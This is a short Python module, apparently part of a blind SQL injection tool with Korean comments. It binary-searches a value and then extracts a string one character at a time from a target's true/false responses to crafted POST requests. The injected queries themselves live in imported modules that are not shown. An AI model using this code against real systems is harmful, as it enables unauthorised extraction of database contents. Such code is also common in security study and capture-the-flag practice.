from attack_setting import attackData
from attack_query import attackQuerys

class Search:
    def binary_search(destination,attack_query):
        querys=attackQuerys()
        min,max = querys.min, querys.max
        test_url = querys.get_complete_query(attack_query,value=0)
        if destination.send_post_request(test_url) != True:
            raise ValueError("0> : 잘못된 쿼리입니다.",test_url)
        
        while (max > min):
            avg = (max+min)//2 
            attack_url = querys.get_complete_query(attack_query,value=avg)
            
            if destination.send_post_request(attack_url)==True: #여기에 쿼리 공격 넣음 
                min = avg+1
            else:
                max = avg
            #print('-',end="",flush=True)

        attack_url = querys.get_complete_query(attack_query,value=min)
        attack_url = attack_url.replace(">","=")
        if destination.send_post_request(attack_url)==True:
            return min
        else:
            attack_url = querys.get_complete_query(attack_query,value=querys.max)
            if destination.send_post_request(attack_url)==True:
                return querys.max
            else:
                raise ValueError("잘못된 쿼리입니다.")

    def letter_search(destination,attack_query,length):
        querys=attackQuerys()
        result = ""
        
        for i in range(1,length+1):
            min ,max = 32,128
            while(max > min):
                avg = (min+max)//2
                attack_url = querys.get_complete_query(attack_query.format(i),value=avg)
                if destination.send_post_request(attack_url)==True:
                    min = avg+1
                else:
                    max = avg
                #print('-',end="",flush=True)
                

            attack_url = querys.get_complete_query(attack_query.format(i),value=min)
            attack_url = attack_url.replace(">","=")
            if destination.send_post_request(attack_url)==True:
                result += chr(min)
                #print(f'\n{i}번째 글자 = {chr(min)}',end="",flush=True)
                print(chr(min),end="",flush=True)
            else:
                raise ValueError("잘못된 쿼리입니다.",attack_url)
        
        return result

    

